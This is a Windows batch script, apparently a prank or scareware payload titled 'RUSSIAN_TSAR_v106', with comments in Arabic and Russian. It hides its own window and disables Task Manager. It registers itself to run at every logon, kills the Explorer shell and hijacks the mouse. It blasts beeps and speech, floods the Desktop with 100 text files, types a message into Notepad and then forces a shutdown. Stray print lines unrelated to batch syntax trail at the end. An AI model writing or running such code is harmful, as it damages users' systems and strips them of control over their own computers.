@echo off
:: [01: STEALTH & RUSSIAN INITIALIZATION]
chcp 65001 >nul
if not "%1"=="tsar" (
    echo Set W=CreateObject("WScript.Shell") > "%temp%\tsar.vbs"
    echo W.Run chr(34) ^& "%~f0" ^& chr(34) ^& " tsar", 0 >> "%temp%\tsar.vbs"
    wscript "%temp%\tsar.vbs" & del "%temp%\tsar.vbs" & exit /b
)

:: [02: THE KREMLIN AMBIANCE - أجواء موسكو القديمة]
:: تحويل الألوان إلى الأحمر والأبيض (طابع الثورة والثلج)
start /b cmd /c "color 4f & title SIBERIAN_PROTOCOL_ACTIVE... & mode con: cols=90 lines=30 & :loop & echo [SYSTEM]: СИБИРСКИЙ МОРОЗ (Siberian Frost) & echo 𓅓 𓅱 𓏏 --- Добро пожаловать в ад ⭐ --- & goto loop"

:: [03: PERSISTENCE & IRON CURTAIN]
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableTaskMgr" /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "TsarLament" /t REG_SZ /d "%~f0" /f >nul 2>&1

:: [04: THE SOVIET-TSAR SONIC ATTACK]
:: (معزوفة الراعي -> ألحان روسية -> صراخ العاصفة -> ضحك الرفاق)
start /b powershell -WindowStyle Hidden -Command "& {
    $v = New-Object -ComObject SAPI.SpVoice; $v.Volume = 100;
    
    # 1. نغمات روسية سريعة (Kalinka Style Beeps)
    [console]::beep(440, 200); [console]::beep(493, 200); [console]::beep(523, 200); [console]::beep(587, 400);

    # 2. جملة ترحيبية بالروسية بصوت عميق
    $v.Rate = -5;
    $v.Speak('Добро пожаловать в Сибирь. Почему ты не смеешься?');

    # 3. صراخ العاصفة الثلجية (High-Pitch Wind Scream)
    for($i=3000; $i -le 9500; $i+=200){ [console]::beep($i, 30) }

    # 4. الـ 100 سؤال (لماذا لا تضحك معي؟) بنبرة قيصرية حادة
    1..100 | ForEach-Object { 
        $v.Rate = (Get-Random -Min -2 -Max 8); 
        $v.Speak('لماذا لا تضحك معي؟');
    }
}"

:: [05: 100 SIBERIAN FEATURES - ميزات الجليد]
powershell -WindowStyle Hidden -Command "Stop-Process -Name explorer -Force; 1..100 | ForEach-Object {
    # 1. تجمد الشاشة (إيقاف حركة الماوس ثم قذفه عشوائياً)
    [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point((Get-Random -Max 1920),(Get-Random -Max 1080));
    
    # 2. رسائل الكرملين (روسي + أندلسي + هيروغليفية)
    if($_ % 10 -eq 0){
        $msg = @('СМЕРТЬ - الموت الروسي', 'Звезда погасла ⭐', 'The Tsar is Watching', 'لماذا لا تضحك مع النجمة؟');
        start cmd /c \"color 4f & echo --- СИБИРСКИЙ ПРОТОКОЛ: $($msg | Get-Random) --- & pause\";
    }

    # 3. حقن ملفات "مخطوطات كيج بي"
    $f = [Environment]::GetFolderPath('Desktop') + '\KGB_Archive_' + $_ + '.txt';
    '𓅓𓅱𓏏.. لقد تجمد نظامك في شتاء موسكو.. لماذا لا تضحك؟ ⭐' | Out-File $f;
    
    # 4. ترددات معدنية خشنة
    [console]::beep((Get-Random -Min 50 -Max 2000), 40);
}"

:: [06: THE GHOST TYPIST (The Red Square Letter)]
start notepad.exe
timeout /t 2 >nul
powershell -Command "$w = New-Object -ComObject WScript.Shell; while(!$w.AppActivate('Notepad')){Sleep 1}; $m = 'في سيبيريا، البرد لا يرحم... والآن النجمة ⭐ تحول نظامك إلى حطام قيصري... الراعي يصرخ بالروسية والضحكات تملأ الساحة الحمراء... لماذا لا تضحك معي؟.. 𓅓𓅱𓏏'; foreach($c in $m.ToCharArray()){$w.SendKeys($c); Start-Sleep -Milliseconds 50}"

:: [07: THE FINAL GULAG SHUTDOWN]
color 4f
cls
echo !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
echo !  [CRITICAL]: RUSSIAN_TSAR_v106 ACTIVE           !
echo !  [STATUS]: SYSTEM FROZEN IN SIBERIA             !
echo !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
echo !  Mors Vincit Omnia. ⭐ 𓅓𓅱𓏏                       !
echo !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

:: الوداع الصوتي الروسي
powershell -Command "$s = New-Object -ComObject SAPI.SpVoice; $s.Rate = -9; $s.Speak('До свидания.. لماذا لا تضحك؟')"

timeout /t 10 >nul
powershell -Command "wininit" >nul 2>&1
shutdown -s -f -t 00 -c "𓅓𓅱𓏏 shut down /578 
shut down quickgj.. الوداع في الجليد."
print"hello world"
print"welcom home"
print"need access to enter"
print